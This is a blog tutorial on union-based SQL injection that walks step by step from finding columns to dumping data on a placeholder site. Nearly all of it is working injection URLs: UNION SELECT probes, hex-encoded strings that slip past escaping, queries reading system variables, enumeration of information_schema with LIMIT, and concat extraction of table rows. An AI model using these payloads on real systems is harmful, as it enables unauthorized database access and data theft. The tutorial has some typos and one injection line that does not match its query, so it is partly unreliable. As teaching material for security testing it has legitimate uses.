---
title: Basic Union Based Injection
publishDate: 2017-02-25
author: Abhinav Kumar
image:   '~/assets/images/SQli.jpg'
excerpt: Basic Union Based Injection. In this tutorial we will learn how to inject Union based injection.
draft: false
category: WebAppSec
---

SQL Injection Basic Union Based Injection. In this tutorial we will learn how to inject Union based injection.

In our last tutorial we learnt how to find out the number of columns used under the query so that we can use Union select statement. So we will continue that same url and same injection we were injecting. In the last tutorial we found that the vulnerable URL is having 5 numbers of columns and the below query was working.


```
http://fakesite.com/report.php?id=23 order by 5--+
```

Now we will use Union select statement over here.

```
http://fakesite.com/report.php?id=23 union select 1,2,3,4,5--+
```

what will it do is concatenate one more row to the output which will look like this

```
| column1 | column2 | column3 | column4 | column5 |
| --- | --- | --- | --- | --- |
| anydata | anydata | anydata | anydata | anydata |
| 1 | 2 | 3 | 4 | 5 |
```

Here a small understanding of the web application is required, If you see any of these numbers printed in the webpage or the title or anywhere else then you can know the the developer is printing multiple rows. But in case you can not see any of these numbers printed then you can simply invalidate the first query so that it wont give any output and eventually your output will become the one and only output to be printed.

```
http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5--+
http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5--+
http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5--+
http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5--+
http://fakesite.com/report.php?id=null union select 1,2,3,4,5--+
http://fakesite.com/report.php?id=23 && 0 union select 1,2,3,4,5--+
```
Above i have specified some ways to make a query invalid but remember that & should be url encoded before usage. Now when we will use any of the above query, one row will come in output.

```
| column1 | column2 | column3 | column4 | column5 |
| --- | --- | --- | --- | --- |
| 1 | 2 | 3 | 4 | 5 |
```

Any of the number must be printed in the webpage again as basic thing to understand is that programmer may be only printing some particular columns from the output, lets say the third one. So we if we can see 3 in the page then its good otherwise we can try the query below with some other values.

```
http://fakesite.com/report.php?id=-23 union select 'hello1','hello2','hello3','hello4','hello5'--+
```

Now just try to find it inside the source code. If you find hello1 that means the first colums is getting printed and if you found hello2 then the second column is getting printed and so on. Still some times if the programmer is using mysql\_real\_escape\_string it may create an error or else no output. We can simply avoid the usage of single quotes using hex values. Below is the encoded query for the above same query.

```
http://fakesite.com/report.php?id=-23 union select 0x68656c6c6f31,0x68656c6c6f32,0x68656c6c6f33,0x68656c6c6f34,0x68656c6c6f35--+
```

One small thing to remember is that always add 0x before any hexadecimal value. Hopefully the above query should work and you will find the column which is getting printed on the webpage or inside the source code. We will stich up with 3rd column for this example. As we know that any thing on place of third column is getting printed. Then now we can try some Default functions and variables, to get some information related to our target. Below are some of the Variables/Functions that can be used to get information about your target machine.

```
| Variable/Function |  | Output |
| --- | --- | --- |
| @@hostname | : | Current Hostname |
| @@tmpdir | : | Tept Directory |
| @@datadir | : | Data Directory |
| @@version | : | Version of DB |
| @@basedir | : | Base Directory |
| user() | : | Current User |
| database() | : | Current Database |
| version() | : | Version |
| schema() | : | current Database |
| UUID() | : | System UUID key |
| current\_user() | : | Current User |
| current\_user | : | Current User |
| system\_user() | : | Current Sustem user |
| session\_user() | : | Session user |
| @@GLOBAL.have\_symlink | : | Check if Symlink Enabled or Disabled |
| @@GLOBAL.have\_ssl | : | Check if it have ssl or not |
```

As we know that third is the column which is getting printed so now we will use the above functions on place of that columns only.

To get the Current Database Name

```
http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5--+
```

To get the Current Version

```
http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+
```
To get the Current User
```
http://fakesite.com/report.php?id=-23 union select 1,2,user(),4,5--+
```

To get the Temporary Directory Path
```
http://fakesite.com/report.php?id=-23 union select 1,2,@@tmpdir,4,5--+
```
Now we will move to our next part, which is Data Extraction.

## Data Extraction using SQLi

There are many ways to extract data using SQLi so first one is union based. First i will show you the Queries and then show you how we can inject them.

```
Query : Select table\_schema from information\_schema.schemata
Injection : http://fakesite.com/report.php?id=-23 union select 1,2,version(),4,5--+
```

Will give us names of all the Databases avaiable. But as we found earlier that sometimes programmer may not be printing all the rows. He may be printing the first row from output. So in that case we can use limit keyword to enumerate the rows one by one.

First row
```
Select table\_schema from information\_schema.schemata limit 0,1--+
```
Second row
```
Select table\_schema from information\_schema.schemata limit 1,1--+
```
Third row

```
Select table\_schema from information\_schema.schemata limit 2,1--+
```
Fourth row
```
Select table\_schema from information\_schema.schemata limit 3,1--+
```
and so on.

In the above manner we can get each row one by one. Now lets see how can we extract all the table names from a database.

```
Query : Select table\_name from information\_schema.talbes where table\_schema='databasename'
Query for Current DB: Select table\_name from information\_schema.tables where table\_schema=database()
Injection : http://fakesite.com/report.php?id=-23 union select 1,2,table\_name,4,5 from information\_schema.tables where table\_schema=database()--+
```
Above injection will give you all the rows at once, but if you want one by one then you can use limit.

First row
```
http://fakesite.com/report.php?id=-23 union select 1,2,table\_name,4,5 from information\_schema.tables where table\_schema=database() limit 0,1--+
```
Second row
```
http://fakesite.com/report.php?id=-23 union select 1,2,table\_name,4,5 from information\_schema.tables where table\_schema=database() limit 1,1--+
```
Third row
```
http://fakesite.com/report.php?id=-23 union select 1,2,table\_name,4,5 from information\_schema.tables where table\_schema=database() limit 2,1--+
```
Forth row
```
http://fakesite.com/report.php?id=-23 union select 1,2,table\_name,4,5 from information\_schema.tables where table\_schema=database() limit 3,1--+
```
and so on.

After getting the Table Names we can move on and start collecting the names of Columns under any table. we can specify the table name as we have all the tablenames.

```
Query : Select column\_name from information\_schema.columns where table\_schema=database() and table\_name='tablenamehere'
Injection : http://fakesite.com/report.php?id=-23 union Select 1,2,column\_name,4,5 from information\_schema.columns where table\_schema=database() and table\_name='tablenamehere'--+
```
If the above query do not give any output or an error. You can try to hex the tablename. And now we can try to get all the table names one by one if only one row is getting printed.

First row
```
http://fakesite.com/report.php?id=-23 union select 1,2,column\_name,4,5 from information\_schema.columns where table\_schema=database() and table\_name='tablename' limit 0,1--+
```
Second row
```
http://fakesite.com/report.php?id=-23 union select 1,2,column\_name,4,5 from information\_schema.columns where table\_schema=database() and table\_name='tablename' limit 1,1--+
```
Third row
```
http://fakesite.com/report.php?id=-23 union select 1,2,column\_name,4,5 from information\_schema.columns where table\_schema=database() and table\_name='tablename' limit 2,1--+
```
Forth row
```
http://fakesite.com/report.php?id=-23 union select 1,2,column\_name,4,5 from information\_schema.columns where table\_schema=database() and table\_name='tablename' limit 3,1--+
```
and so on...

Now we know the database name, the table names and the column names so the last stage starts of extracting data from the columns. Now we have to specify from which column we want the data and from which table. Query and injection is simple at this stage

```
Query : Select column1, column2 from tablename
First row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1--+
Second row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 1,1--+
Third row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 2,1--+
Forth row : http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 3,1--+
```
Thats all for Basic Union Based Injection.
